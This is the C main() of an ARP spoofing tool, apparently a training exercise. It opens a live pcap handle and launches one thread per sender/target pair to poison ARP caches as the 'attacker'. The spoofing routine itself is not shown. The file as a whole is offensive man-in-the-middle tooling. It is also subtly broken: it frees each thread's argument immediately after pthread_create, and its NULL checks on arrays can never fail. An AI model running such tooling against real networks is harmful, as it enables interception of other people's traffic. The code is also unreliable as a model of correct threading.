#include "arp_spoof.h"

int main(int argc, char *argv[]) {
	pcap_t *handle;
	pthread_t thread[MAX_THREAD];
	u_int8_t errbuf[PCAP_ERRBUF_SIZE];
	u_int8_t *interface = argv[1];
	u_int8_t attacker_mac[ETHER_ADDR_LEN];
	u_int8_t attacker_ip[IP_ADDR_LEN];
	u_int8_t sender_ip[MAX_THREAD][IP_ADDR_LEN];
	u_int8_t target_ip[MAX_THREAD][IP_ADDR_LEN];
	u_int32_t status[MAX_THREAD];
	u_int32_t i;
	struct pcap_pkthdr *header;
	struct pthread_arg *arg[MAX_THREAD];

	if(argc < 4 || argc % 2 != 0) {
		printf("Usage : ./send_arp <interface> <sender ip> <target ip> <sender ip2> <target ip2> ... <sender id%d> <target ip%d>\n", MAX_THREAD, MAX_THREAD);
		return -1;
	}
	
	for(i=2;i<argc;i+=2) {
		inet_pton(AF_INET, argv[i], sender_ip[i/2-1]);
		inet_pton(AF_INET, argv[i+1], target_ip[i/2-1]);
	}

	handle = pcap_open_live(interface, BUFSIZ, 1, 1000, errbuf);
	if(handle == NULL) {
		printf("Couldn't open device %s: %s\n", interface, errbuf);
		return -1;
	}

	get_mac(attacker_mac, interface);
	if(attacker_mac == NULL) {
		printf("Couldn't get attacker's MAC address\n");
		return -1;
	}
	
	get_ip(attacker_ip, interface);
	if(attacker_ip == NULL) {
		printf("Couldn't get attacker's IP address\n");
		return -1;
	}
	printf("\n------spoofed by bl4nk-------\n");
	print_mac(attacker_mac, "Attacker");
	print_ip(attacker_ip, "Attacker");
	printf("-----------------------------\n");

	for(i=0;i<(argc-2)/2;i++) {
		printf("\n----------Session %d----------\n", i + 1);
		arg[i] = (struct pthread_arg *)malloc(sizeof(struct pthread_arg));
		arg[i]->session_num = i+1; printf("session num : %d\n", arg[i]->session_num);
		arg[i]->handle = handle;
		arg[i]->interface = interface; printf("interface : %s\n", arg[i]->interface);
		memcpy(arg[i]->attacker_mac, attacker_mac, ETHER_ADDR_LEN);
		memcpy(arg[i]->attacker_ip, attacker_ip, IP_ADDR_LEN);
		memcpy(arg[i]->sender_ip, sender_ip[i], IP_ADDR_LEN); print_ip(arg[i]->sender_ip, "Sender");
		memcpy(arg[i]->target_ip, target_ip[i], IP_ADDR_LEN); print_ip(arg[i]->target_ip, "Target");
		pthread_create(&thread[i], NULL, arp_spoof, (void *)arg[i]);
		printf("-----------------------------\n");
		free(arg[i]);
	}
	
	for(i=0;i<(argc-2)/2;i++) {
		pthread_join(thread[i], (void **)&status[i]);
	}
}
